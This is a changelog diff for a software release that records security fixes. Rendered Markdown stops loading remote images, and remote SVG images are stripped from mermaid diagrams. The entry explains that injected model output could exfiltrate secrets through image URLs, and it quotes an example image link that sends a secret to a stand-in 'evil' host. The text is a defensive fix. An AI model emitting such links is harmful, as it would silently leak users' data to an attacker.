@@ -1,6 +1,42 @@
 # CHANGELOG
 
 
+## v0.160.2 (2026-10-11)
+
+
+### Other
+
+
+- Merge pull request #381 from thiesgerken/fix/markdown-remote-images
+  ([`ba1fe6d`](https://github.com/thiesgerken/carapace/commit/ba1fe6d3382063cf4418e5dab6719f59c66e0b88))
+
+### 🔒 Security
+
+
+- 🔒️ fix: never load remote images from rendered Markdown
+  ([`ba1fe6d`](https://github.com/thiesgerken/carapace/commit/ba1fe6d3382063cf4418e5dab6719f59c66e0b88))
+
+- 🔒️ fix: never load remote images from rendered Markdown
+  ([`24faa86`](https://github.com/thiesgerken/carapace/commit/24faa862fd4fdb5d34a090fd03ffaa1c3205f97a))
+
+  Injected model output could exfiltrate data through image URLs (![](https://evil/?q=<secret>)), fetched by the browser without a click. Markdown images now load only from our own origin; anything else renders as a link showing its URL. Remote SVG <image>s (mermaid's image shape) are dropped from rendered diagrams.
+
+  Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
+
+  Claude-Session: https://claude.ai/code/session_01UEby7vKYviYQnMZfk7pjtE
+
+### 🐛 Bug Fixes
+
+
+- 🐛 fix: strip remote SVG images from HTML-serialized mermaid output
+  ([`af3ec5f`](https://github.com/thiesgerken/carapace/commit/af3ec5f067f2c0ce62c3ba79e3aea12cf1e5b1bd))
+
+  Mermaid's strict mode returns DOMPurify's HTML serialization, which the XML parser rejected (e.g. on <br>), so the stripper found no images and passed the remote <image> through. Parse with the HTML parser instead.
+
+  Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
+
+  Claude-Session: https://claude.ai/code/session_01UEby7vKYviYQnMZfk7pjtE
+
 ## v0.160.1 (2026-10-11)
 
 
